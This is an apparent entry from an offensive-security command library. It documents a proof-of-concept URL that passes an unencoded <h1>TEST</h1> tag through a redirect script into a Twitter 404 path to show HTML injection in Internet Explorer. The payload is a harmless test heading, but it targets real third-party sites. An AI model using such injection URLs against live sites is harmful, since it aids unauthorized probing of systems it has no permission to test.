---
id: cmd-ie-html-url
data: >-
  http://secgeek.net/POC/redir.php?x=https://sms-be-vip.twitter.com/<h1>TEST</h1>
tags:
  - injection
  - ie
type: command
output: null
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:20.784Z'
verified: false
validated: true
submitted: true
---
# ie-html-injection-url

## Command

```url
http://secgeek.net/POC/redir.php?x=https://sms-be-vip.twitter.com/<h1>TEST</h1>
```

## Description

Browser URL to trigger PHP redirect with unencoded HTML tag in the Twitter 404 path, demonstrating basic injection in IE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `x` | Full target URL with HTML | Yes |

## Examples

### Basic Usage

Paste into IE address bar for redirect and injection.

### Advanced Usage

Combine with padding for full visibility.

## Expected Output

Redirects to 404 page where <h1>TEST</h1> renders as heading.

## Related

- [[procedures/Access-Redirect-with-HTML-Tags-in-IE]]
